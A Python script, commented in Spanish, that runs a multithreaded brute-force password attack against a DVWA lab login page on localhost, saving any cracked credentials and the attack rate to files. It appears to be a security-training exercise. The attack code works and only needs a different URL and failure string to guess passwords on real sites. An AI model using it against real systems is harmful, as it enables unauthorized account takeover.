#!/usr/bin/env python3
"""
bruteforce_get_threaded.py
Ejecuta un ataque de fuerza bruta tipo GET contra DVWA (Low) usando threads.
Asegura enviar cookies (security=low) para reproducibilidad.
Salida: results.txt con credenciales encontradas y metrics.txt con tiempos.
"""

import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
from pathlib import Path

# Configuración
URL = "http://127.0.0.1:8080/vulnerabilities/brute/"
USER = "admin"
PW_FILE = "passwords_big.txt"
# ajusta PHPSESSID si quieres
COOKIES = {"security": "low", "PHPSESSID": "qj8m6ntmr9m9h99b40dk6glvu7"}
# usar exactamente como en el body
FAIL_STRING = "Username and/or password incorrect."
THREADS = 10  # ajustar concurrencia
TIMEOUT = 10  # timeout por request


def attempt(password, session):
    params = {"username": USER, "password": password, "Login": "Login"}
    try:
        r = session.get(URL, params=params, timeout=TIMEOUT,
                        allow_redirects=True)
    except Exception as e:
        return {"password": password, "ok": False, "error": str(e), "status": None}
    # Si la cadena de fallo NO está => posible éxito
    ok = FAIL_STRING not in r.text
    return {"password": password, "ok": ok, "status": r.status_code, "len": len(r.text)}


def main():
    pwlist = [p.strip()
              for p in Path(PW_FILE).read_text().splitlines() if p.strip()]
    results = []
    session = requests.Session()
    session.headers.update({"User-Agent": "bruteforce-threaded/1.0"})
    start = time.perf_counter()
    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        futures = {ex.submit(attempt, p, session): p for p in pwlist}
        checked = 0
        for fut in as_completed(futures):
            res = fut.result()
            checked += 1
            print(
                f"[{checked}/{len(pwlist)}] {res['password']} -> {'OK' if res['ok'] else 'FAIL'} (status={res['status']})")
            results.append(res)
    total = time.perf_counter() - start
    found = [r for r in results if r["ok"]]
    # Guardar resultados
    Path("results.txt").write_text(
        "\n".join(f"{USER}:{r['password']}" for r in found))
    Path("metrics.txt").write_text(
        f"attempts={len(pwlist)}\ntime={total:.2f}\nrate={len(pwlist)/total:.2f}\nthreads={THREADS}\n")
    print("Done. attempts=", len(pwlist), "time=",
          total, "rate=", len(pwlist)/total)
    if found:
        print("Found:", found)


if __name__ == "__main__":
    main()
